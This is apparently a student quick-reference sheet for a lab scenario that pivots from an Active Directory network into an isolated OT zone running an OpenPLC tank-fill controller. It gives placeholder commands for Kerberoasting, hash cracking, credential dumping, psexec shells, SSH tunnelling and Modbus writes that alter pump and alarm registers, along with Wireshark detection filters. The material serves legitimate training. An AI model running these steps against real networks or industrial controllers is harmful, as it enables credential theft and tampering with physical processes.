# Quick Reference — SCEN-004: ICS/OT Pivot

**One-page reference for students. No spoilers. No credentials beyond initial foothold.**

---

## Network Diagram

```
┌─────────────────────┐     ┌──────────────────────────────────┐
│  RED ZONE (vmbr1)   │     │  BLUE ZONE / IT (vmbr2)          │
│                     │     │  Domain: lab.local               │
│  kali-attacker      ├─────┤                                  │
│  YOUR MACHINE       │     │  dc01              eng-ws        │
│                     │     │  Domain Controller  Eng Workst.  │
│  IP: ________       │     │  IP: ________      IP: ________  │
└─────────────────────┘     └──────────────────────┬───────────┘
                                                   │
                            ┌──────────────────────┴───────────┐
                            │  OT ZONE (vmbr3)                 │
                            │  *** NOT DIRECTLY REACHABLE ***  │
                            │                                  │
                            │  openplc-01    historian   grfics │
                            │  Modbus:502    Grafana     HMI   │
                            │  WebUI:8080    InfluxDB    :8080 │
                            │  IP: ________  IP: _______ IP: __│
                            └──────────────────────────────────┘
```

Fill in IP addresses from your access sheet.

---

## ATT&CK Techniques in This Scenario

| ID | Name | Matrix | Phase |
|---|---|---|---|
| T1021.002 | Remote Services: SMB/Admin Shares | Enterprise | 1 |
| T1558.003 | Kerberoasting | Enterprise | 2 |
| T1003.001 | OS Credential Dumping: LSASS | Enterprise | 2 |
| T1021.004 | Remote Services: SSH | Enterprise | 3 |
| T0846 | Remote System Discovery | ICS | 4 |
| T0842 | Network Sniffing | ICS | 4 |
| T0855 | Unauthorized Command Message | ICS | 4 |
| T0836 | Modify Parameter | ICS | 4 |

---

## Tool Commands by Phase

### Phase 1 — AD Access and Enumeration

```bash
# Validate credentials
crackmapexec smb <target> -u <user> -p '<pass>' -d lab.local

# Remote shell (Impacket)
impacket-psexec <domain>/<user>:'<pass>'@<target>

# AD enumeration (from Windows shell)
net user /domain
net group "Domain Admins" /domain
net user <username> /domain
net group "Domain Computers" /domain
```

### Phase 2 — Kerberos and Credential Attacks

```bash
# Kerberoasting — request TGS tickets for SPN accounts
impacket-GetUserSPNs <domain>/<user>:'<pass>' -dc-ip <dc_ip> -request

# Save hash to file
impacket-GetUserSPNs <domain>/<user>:'<pass>' -dc-ip <dc_ip> -request \
  -outputfile <outfile>.hash

# Crack Kerberos TGS hash (mode 13100)
hashcat -m 13100 <hashfile> /usr/share/wordlists/rockyou.txt

# Credential dumping
impacket-secretsdump <domain>/<user>:'<pass>'@<target>

# Share enumeration
crackmapexec smb <target> -u <user> -p '<pass>' -d lab.local --shares
```

### Phase 3 — SSH Tunneling

```bash
# SSH to a remote host
ssh <user>@<host>

# Enumerate network interfaces (from remote host)
ip addr show
ip route show

# Network scan (from remote host)
nmap -sn <subnet>/24
nmap -p 502,8080,3000,8086 <target_range>

# SOCKS proxy (dynamic port forward)
ssh -D 1080 -N <user>@<host>

# Local port forward (map remote port to localhost)
ssh -L <local_port>:<remote_host>:<remote_port> -N <user>@<host>

# Multiple local port forwards
ssh -L <lport1>:<rhost1>:<rport1> \
    -L <lport2>:<rhost2>:<rport2> \
    -N <user>@<host>

# Route tools through SOCKS proxy
proxychains <command>

# proxychains config (/etc/proxychains4.conf)
# Set: socks5 127.0.0.1 1080
```

### Phase 4 — Modbus TCP

```python
from pymodbus.client import ModbusTcpClient

# Connect (use localhost + forwarded port if using SSH tunnel)
client = ModbusTcpClient('<host>', port=<port>)
client.connect()

# Read coils (FC01)
result = client.read_coils(<address>, <count>, slave=1)
print(result.bits)

# Read input registers (FC04)
result = client.read_input_registers(<address>, <count>, slave=1)
print(result.registers)

# Read holding registers (FC03)
result = client.read_holding_registers(<address>, <count>, slave=1)
print(result.registers)

# Write single coil (FC05)
client.write_coil(<address>, <True/False>, slave=1)

# Write single register (FC06)
client.write_register(<address>, <value>, slave=1)

client.close()
```

---

## Modbus Register Map — OpenPLC (tank_fill_control.st)

| Register | Address | Function Code | Type | Description |
|---|---|---|---|---|
| Pump Enable | Coil 0 | FC01/FC05 | R/W | Main pump on/off |
| Alarm High | Coil 1 | FC01 | R | High level alarm |
| Alarm Low | Coil 2 | FC01 | R | Low level alarm |
| Tank Level | IR 0 | FC04 | R | Current level (0-1000) |
| Pump Speed | HR 0 | FC03 | R | Current pump speed |
| Setpoint | HR 1024 | FC03/FC06 | R/W | Target level |
| Alarm High Thresh | HR 1025 | FC03/FC06 | R/W | High alarm trigger |
| Alarm Low Thresh | HR 1026 | FC03/FC06 | R/W | Low alarm trigger |

Slave ID: 1 for all operations.

---

## Wireshark Filters

```
# All Modbus TCP traffic
modbus

# Write operations only (attack indicator)
modbus.func_code == 5 || modbus.func_code == 6

# Holding register writes
modbus.func_code == 6

# Traffic to a specific host
modbus && ip.dst == <plc_ip>

# Kerberos traffic
kerberos

# SMB traffic
smb2
```

---

## Deliverables

1. Full attack chain documentation with commands and output for each phase
2. Modbus register read/write evidence (screenshots or command output)
3. Completed incident report (use INCIDENT_REPORT_TEMPLATE.md)
4. ATT&CK mapping table with both Enterprise and ICS technique IDs
5. Network pivot path diagram showing all three zones
